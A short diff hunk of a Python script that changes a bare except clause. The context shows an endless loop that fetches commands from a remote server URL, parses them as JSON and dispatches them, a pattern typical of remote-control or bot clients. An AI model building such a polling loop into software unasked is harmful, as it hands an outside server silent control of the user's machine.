@@ -28,7 +28,7 @@ while 1:
     try:
         command=get(server_url).text
         command = dict(json.loads(command))
-    except:
+    except Exception as e:
         pass
     else:
         parse_command(command)
